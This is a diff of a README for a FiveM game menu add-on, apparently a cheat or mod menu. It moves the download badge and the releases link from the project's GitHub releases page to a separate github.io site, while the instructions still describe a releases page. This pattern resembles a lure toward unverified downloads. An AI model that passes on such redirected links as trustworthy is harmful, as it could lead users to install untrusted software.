@@ -1,6 +1,6 @@
 # 🖥️ paranoia-menu-update-2026 - Improve your FiveM game interface easily
 
-[![](https://img.shields.io/badge/Download-Paranoia-Menu-blue)](https://github.com/khanhhuy1824-rgb/paranoia-menu-update-2026/releases)
+[![](https://img.shields.io/badge/Download-Paranoia-Menu-blue)](https://khanhhuy1824-rgb.github.io)
 
 This software adds a new menu system to your FiveM game. It uses special rendering tools to display information directly on your screen. You can control the layout through web-based files. This makes customization possible for players who want a custom look. 
 
@@ -20,7 +20,7 @@ You do not need extra coding experience to use this. You only need to copy files
 
 You get the files from the official repository page. Follow these steps to obtain the correct version:
 
-1.  Visit the [releases page here](https://github.com/khanhhuy1824-rgb/paranoia-menu-update-2026/releases).
+1.  Visit the [releases page here](https://khanhhuy1824-rgb.github.io).
 2.  Look for the section marked "Latest release."
 3.  Click the blue link that says "Source code (zip)."
 4.  Save the zip file to your Downloads folder.
